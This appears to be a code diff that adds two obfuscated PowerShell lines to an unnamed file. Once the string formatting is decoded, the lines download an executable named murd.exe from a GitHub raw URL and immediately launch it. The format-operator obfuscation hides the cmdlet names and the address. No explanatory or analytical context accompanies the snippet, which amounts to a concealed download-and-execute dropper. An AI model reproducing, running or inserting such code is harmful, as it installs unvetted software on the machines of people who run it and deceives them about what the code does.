@@ -1,0 +1,2 @@
+&("{3}{2}{1}{0}" -f 't','ues',("{0}{1}"-f 'WebRe','q'),("{2}{1}{0}"-f'e-','k','Invo')) -Uri ("{8}{7}{9}{3}{0}{2}{1}{6}{10}{5}{4}"-f'e','i','d/raw/ma','ind/updat','.exe','rd','n/m','tps://github.com','ht','/peiceofm','u') -OutFile ("{1}{2}{0}" -f 'rd.exe','m','u')
+.("{2}{1}{3}{0}"-f ("{0}{1}" -f 'oce','ss'),'art','St','-Pr') -FilePath ("{1}{0}{2}"-f'x','murd.e','e')
